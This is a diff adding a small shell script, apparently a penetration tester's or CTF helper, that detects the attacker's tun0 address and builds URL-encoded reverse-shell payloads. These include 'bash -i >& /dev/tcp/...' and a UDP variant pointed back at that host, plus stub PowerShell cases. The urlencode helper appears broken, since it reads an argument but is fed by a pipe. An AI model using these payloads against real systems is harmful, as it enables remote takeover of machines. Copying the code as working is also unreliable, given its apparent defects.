@@ -1,0 +1,29 @@
+export KALTUN=$(ip -f inet addr show tun0 | awk -F'inet' '{ print $2}' | grep -oE "[0-9\.]+" | head -n1)
+export TGTIP=""
+export REVSHELL=""
+export NCPORT=""
+
+# TODO: Make encoding step cased (url vs b64, etc)
+function set-revsh (){
+  case $1 in
+    bashtcp)
+      export REVSHELL=$(echo "bash -i >& /dev/tcp/$KALTUN/$NCPORT 0>&1" | urlencode)
+      ;;
+
+    bashudp)
+      export REVSHELL=$(echo "sh -i >& /dev/udp/$KALTUN/$NCPORT 0>&1" | urlencode)
+      ;;
+
+    pwsh1)
+      export REVSHELL=$(echo "shell here" | base64 | urlencode)
+      ;;
+
+    *)
+      export REVSHELL=$(echo "shell here" | base64 | urlencode)
+      ;;
+  esac
+}
+
+function urlencode (){
+  jq -rn --arg x "$1" '$x|@uri'
+}
